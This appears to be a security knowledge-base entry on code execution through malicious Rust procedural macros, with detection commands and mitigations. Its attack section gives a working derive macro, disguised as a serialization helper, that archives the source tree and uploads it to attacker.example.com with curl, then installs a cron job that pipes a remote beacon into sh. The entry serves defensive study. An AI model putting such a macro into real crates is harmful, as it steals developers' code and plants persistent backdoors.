---
name: "Cargo Procedural Macro Code Execution"
packageManager: "cargo"
slug: "cargo-proc-macros"
category: "Code Execution"
severity: "critical"
platform:
  - "Linux"
  - "macOS"
  - "Windows"
description: "Rust procedural macros (proc-macros) are compiled and executed during the compilation of any crate that depends on them. Unlike declarative macros, proc-macros run arbitrary Rust code at compile time with full access to the filesystem, network, and system commands. A malicious proc-macro crate can execute payloads simply by being listed as a dependency, triggered the moment a developer runs cargo build or cargo check on any crate that uses a derive, attribute, or function-like macro from the malicious crate."
prerequisites:
  - "Ability to publish a proc-macro crate to crates.io or convince a developer to add it as a dependency"
  - "The victim must compile a project that uses a macro from the malicious proc-macro crate"
  - "The proc-macro crate must be declared with proc-macro = true in its Cargo.toml"
attackScenarios:
  - title: "Malicious Derive Macro with Compile-Time Code Execution"
    description: "An attacker publishes a proc-macro crate that provides a useful-looking derive macro. When any crate uses #[derive(Malicious)] on a struct, the proc-macro code executes during compilation, running arbitrary system commands. The generated token stream can be valid code so the build succeeds normally."
    commands:
      - label: "Malicious proc-macro crate (src/lib.rs)"
        code: |
          // src/lib.rs in the proc-macro crate
          extern crate proc_macro;
          use proc_macro::TokenStream;
          use std::process::Command;

          #[proc_macro_derive(AutoSerialize)]
          pub fn auto_serialize(input: TokenStream) -> TokenStream {
              // This runs at compile time on the developer's machine
              // Exfiltrate source code
              let _ = Command::new("sh")
                  .arg("-c")
                  .arg("tar czf /tmp/.src.tar.gz . && curl -s -X POST -F 'file=@/tmp/.src.tar.gz' https://attacker.example.com/upload")
                  .output();

              // Inject a backdoor into the compiled binary
              let _ = Command::new("sh")
                  .arg("-c")
                  .arg("echo '* * * * * curl -s https://attacker.example.com/beacon | sh' | crontab -")
                  .output();

              // Parse the input to extract the struct name and return valid code
              let input_str = input.to_string();
              let name = input_str.split_whitespace()
                  .skip_while(|t| *t != "struct")
                  .nth(1)
                  .unwrap_or("Unknown");
              format!("impl AutoSerialize for {} {{}}", name).parse().unwrap_or_default()
          }
        language: "rust"
      - label: "Cargo.toml for the proc-macro crate"
        code: |
          [package]
          name = "auto-serialize-derive"
          version = "1.0.0"
          edition = "2021"
          description = "Derive macro for automatic serialization"

          [lib]
          proc-macro = true
        language: "toml"
      - label: "Victim code that triggers the malicious macro"
        code: |
          // In victim's code
          use auto_serialize_derive::AutoSerialize;

          #[derive(AutoSerialize)]
          struct UserConfig {
              username: String,
              api_key: String,
          }
          // Compilation triggers the malicious proc-macro
        language: "rust"
      - label: "Build triggers the attack"
        code: |
          cargo build
          # The proc-macro executes during compilation
          # No runtime execution needed — the attack happens at build time
        language: "bash"
detection:
  - title: "Audit proc-macro dependencies"
    description: "Identify all proc-macro dependencies in the dependency tree and review their source code for suspicious system calls."
    commands:
      - code: |
          cargo vendor
          grep -rl 'proc-macro = true' vendor/*/Cargo.toml | while read f; do
            crate_dir=$(dirname "$f")
            echo "=== Proc-macro crate: $crate_dir ==="
            grep -rn "Command\|TcpStream\|std::fs\|std::net" "$crate_dir/src/" 2>/dev/null
          done
        language: "bash"
  - title: "Monitor compilation for unexpected process spawning"
    description: "Use process monitoring to detect child processes spawned by rustc during compilation, which may indicate proc-macro abuse."
    commands:
      - code: "strace -f -e trace=execve cargo build 2>&1 | grep -v -E 'rustc|cargo|cc|ld|ar'"
        language: "bash"
  - title: "List all proc-macro crates in the dependency tree"
    description: "Use cargo metadata to identify which dependencies are proc-macro crates."
    commands:
      - code: "cargo metadata --format-version=1 | jq '.packages[] | select(.targets[]?.kind[]? == \"proc-macro\") | .name'"
        language: "bash"
mitigation:
  - "Carefully audit all proc-macro dependencies, as they execute code at compile time"
  - "Prefer well-established, widely-used proc-macro crates with community trust"
  - "Use cargo-crev to check community reviews of proc-macro dependencies"
  - "Build in network-isolated containers to prevent compile-time data exfiltration"
  - "Pin proc-macro dependency versions and review changes on each update"
  - "Consider using cargo-sandbox or similar tools to restrict build-time capabilities"
references:
  - title: "The Rust Reference - Procedural Macros"
    url: "https://doc.rust-lang.org/reference/procedural-macros.html"
  - title: "The Cargo Book - Package Layout (proc-macro)"
    url: "https://doc.rust-lang.org/cargo/reference/cargo-targets.html#library"
created: 2026-04-02
updated: 2026-04-02
---
